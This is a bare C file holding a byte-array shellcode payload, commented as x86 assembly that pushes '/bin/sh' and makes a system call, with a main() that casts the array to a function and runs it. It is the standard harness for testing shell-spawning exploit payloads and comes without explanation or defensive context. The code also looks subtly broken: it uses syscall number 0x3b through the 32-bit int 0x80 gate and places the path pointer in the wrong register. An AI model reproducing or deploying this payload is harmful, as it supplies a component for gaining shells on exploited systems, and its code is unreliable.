unsigned char shellcode[] = {
    0x31, 0xc0,                   // xor %eax, %eax
    0x50,                         // push %eax
    0x89, 0xe0,                   // mov %esp, %eax
    0x83, 0xe8, 0x0c,             // sub $0x0c, %eax
    0x50,                         // push %eax
    0x89, 0xe3,                   // mov %esp, %ebx
    0x68, 0x2f, 0x73, 0x68, 0x00, // push $0x68732f
    0x68, 0x2f, 0x62, 0x69, 0x6e, // push $0x6e69622f
    0x89, 0xe2,                   // mov %esp, %edx
    0x31, 0xc0,                   // xor %eax, %eax
    0x50,                         // push %eax
    0x53,                         // push %ebx
    0x52,                         // push %edx
    0x50,                         // push %eax
    0xb0, 0x3b,                   // mov $0x3b, %al
    0xcd, 0x80,                   // int $0x80
};

int main(void)
{
    void (*p)(void);
    p = (void(*)())shellcode;
    p();
    return 0;
}
